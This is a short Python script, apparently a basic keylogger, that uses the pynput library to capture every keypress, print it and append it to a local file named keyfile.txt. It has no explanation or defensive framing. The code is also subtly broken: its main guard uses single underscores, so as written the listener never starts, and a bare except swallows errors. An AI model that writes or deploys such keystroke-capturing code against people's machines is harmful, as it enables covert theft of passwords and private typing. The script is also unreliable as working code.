from pynput import keyboard
def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logkey:
        try:
            char = key.char
            logkey.write(char)
        except:
            print("error getting char")

if _name_ == "_main_":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()
